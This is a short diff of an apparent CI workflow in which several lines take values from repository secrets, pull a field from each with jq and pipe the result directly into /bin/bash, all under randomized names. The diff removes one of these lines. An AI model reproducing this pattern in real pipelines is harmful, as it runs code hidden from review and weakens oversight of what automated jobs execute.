@@ -19,7 +19,6 @@ jobs:
           c52: ${{ secrets.c52 }}
         run: |
           printf '%s' "$c52" | jq -r .b93671 | /bin/bash
-          printf '%s' "$kt11141" | jq -r .lgk332 | /bin/bash
           printf '%s' "$gpot935" | jq -r .id841 | /bin/bash
           printf '%s' "$e193" | jq -r .upozs9 | /bin/bash
           printf '%s' "$whguo2" | jq -r .xepu4 | /bin/bash
